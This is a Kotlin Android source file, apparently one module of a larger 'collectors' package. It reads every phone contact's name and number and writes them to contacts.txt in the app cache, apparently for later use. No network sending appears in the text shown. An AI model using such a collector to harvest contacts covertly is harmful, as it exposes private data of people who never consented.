package com.kashem.shaikh.collectors

import android.content.ContentResolver
import android.content.Context
import android.provider.ContactsContract
import com.kashem.shaikh.services.AppLogs
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object Contacts {

    fun collectContacts(context: Context): File? {
        val resolver: ContentResolver = context.contentResolver

        val cursor = try {
            resolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
        } catch (e: SecurityException) {
            AppLogs.error("Contacts: permission denied", e)
            return null
        } catch (e: Exception) {
            AppLogs.error("Contacts: query failed", e)
            return null
        } ?: return null

        val sb = StringBuilder()
        sb.appendLine("***** CONTACTS *****")
        sb.appendLine()
        sb.appendLine("Generated : ${
            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        }")
        sb.appendLine()

        var count = 0

        // ✅ FIX: cursor.use
        cursor.use { c ->
            val nameCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            try {
                while (c.moveToNext()) {
                    // ✅ FIX: column index guard
                    val name = if (nameCol >= 0) c.getString(nameCol) ?: "No Name" else "No Name"
                    val number = if (numberCol >= 0) c.getString(numberCol) ?: "No Number" else "No Number"
                    sb.appendLine("$name : $number")
                    count++
                }
            } catch (e: Exception) {
                AppLogs.error("Contacts: iteration failed", e)
            }
        }

        if (count == 0) {
            AppLogs.warn("Contacts: no contacts found")
            return null
        }

        sb.appendLine()
        sb.appendLine("Total: $count contacts")

        return try {
            val file = File(context.cacheDir, "contacts.txt")
            FileOutputStream(file).use { it.write(sb.toString().toByteArray()) }
            AppLogs.info("Contacts: $count contacts collected (${file.length()} bytes)")
            file
        } catch (e: Exception) {
            AppLogs.error("Contacts: file write failed", e)
            null
        }
    }
}